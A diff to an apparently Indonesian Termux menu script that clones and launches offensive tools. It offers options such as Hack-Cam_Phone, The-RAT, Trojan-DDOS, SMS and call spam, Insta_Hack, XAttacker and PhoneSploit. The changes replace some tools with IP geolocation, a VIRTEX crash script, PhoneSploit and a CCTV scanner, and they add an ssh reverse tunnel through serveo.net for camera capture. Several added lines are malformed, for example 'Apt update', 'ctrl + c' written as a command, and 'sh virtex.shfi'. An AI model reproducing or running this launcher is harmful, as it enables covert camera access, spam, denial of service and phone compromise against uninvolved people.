@@ -102,14 +102,14 @@ echo
 echo $cy"⊱XͭPͪLͤᗝIƬ༻₁₀₀ᵏ Menu:"
 echo $ku"["$me"1"$ku"]"$i" Efbeh-Gelap"
 echo $ku"["$me"2"$ku"]"$i" Hack-Cam_Phone"
-echo $ku"["$me"3"$ku"]"$i" The-RAT"
+echo $ku"["$me"3"$ku"]"$i" Check IP"
 echo $ku"["$me"4"$ku"]"$i" Malicious"
 echo $ku"["$me"5"$ku"]"$i" Trojan-DDOS"
 echo $ku"["$me"6"$ku"]"$i" Spam-Call"
 echo $ku"["$me"7"$ku"]"$i" Spam-Sms"
-echo $ku"["$me"8"$ku"]"$i" Locate_Track"
-echo $ku"["$me"9"$ku"]"$i" Fb-Creat_Free"
-echo $ku"["$me"10"$ku"]"$i" SPAM WHATSHAPP"
+echo $ku"["$me"8"$ku"]"$i" Virteks"
+echo $ku"["$me"9"$ku"]"$i" Phone Sploit"
+echo $ku"["$me"10"$ku"]"$i" CCTV"
 echo $ku"["$me"11"$ku"]"$i" Insta_Hack(Root-Only)"
 echo $ku"["$me"12"$ku"]"$i" XAttacker"
 echo $ku"["$me"13"$ku"]"$i" SPAM SMS BRUTAL TERBARU"
@@ -137,7 +137,14 @@ then
 clear
 figlet -f slant "TUNGGU"|lolcat
 sleep 1
+Apt update && apt upgrade
+Apt install git 
+pkg install fish
 git clone https://github.com/TheSploit/Hack-Cam_Phone.git
+Pkg install openssh
+ssh -R 80:localhost:3000 serveo.net
+ctrl + c *input ctrl + c untuk lanjut step
+fish
 cd Hack-Cam_Phone
 bash saycheese.sh
 fi
@@ -147,9 +154,14 @@ then
 clear
 figlet -f slant "TUNGGU"|lolcat
 sleep 1
-git clone https://github.com/TheSploit/The-RAT.git
-cd The-RAT
-python2 A-Rat.py
+apt update && apt upgrade
+apt instal python
+apt install git
+git clone https://github.com/maldevel/IPGeolocation
+cd IPGeolocation
+chmod +x ipgeolocation.py
+pip install -r requirements.txt
+python ipgeolocation.py -m
 fi
 
 if [ $pil = 4 ]
@@ -197,9 +209,16 @@ then
 clear
 figlet -f slant "TUNGGU"|lolcat
 sleep 1
-git clone https://github.com/TheSploit/Locate_Track.git
-cd Locate_Track
-bash lokasi.sh
+apt update && apt upgrade
+apt install git
+apt install curl
+apt install figlet
+apt install ruby
+gem install lolcat
+git clone https://github.com/muhammadfathul/VIRTEX
+cd VIRTEX
+chmod +x virtex.sh
+sh virtex.shfi
 fi
 
 if [ $pil = 9 ]
@@ -207,13 +226,10 @@ then
 clear
 figlet -f slant "TUNGGU"|lolcat
 sleep 1
-git clone https://github.com/TheSploit/Fb-Creat_Free.git
-cd Fb-Creat_Free
-pip install bs4
-pip install mechanize
-pip install requests
-python2 fb-maker.py
-python fb-maker.py -c 5
+git clone https://github.com/Zucccs/PhoneSploit.git
+cd PhoneSploit
+pip install colorama
+python2 main_linux.py
 fi
 
 if [ $pil = 10 ]
@@ -221,9 +237,13 @@ then
 clear
 figlet -f slant "TUNGGU"|lolcat
 sleep 1
-git clone https://github.com/4L13199/LITESPAM.git
-cd LITESPAM
-sh LITESPAM.sh
+apt update && apt upgrade
+pkg install python2
+pip install requests
+pkg install git
+git clone https://github.com/kancotdiq/ipcs.git
+cd ipcs
+python2 scan.py
 fi
 
 if [ $pil = 11 ]
@@ -256,9 +276,9 @@ then
 clear
 figlet -f slant "TUNGGU"|lolcat
 sleep 1
-git clone https://github.com/N74NK/brutalsms.git
-cd brutalsms
-python2 brutalsms.py
+git clone https://github.com/TERMUXID3/brutal-sms.git
+cd brutal-sms
+python2 run.py
 fi
 
 if [ $pil = 14 ]
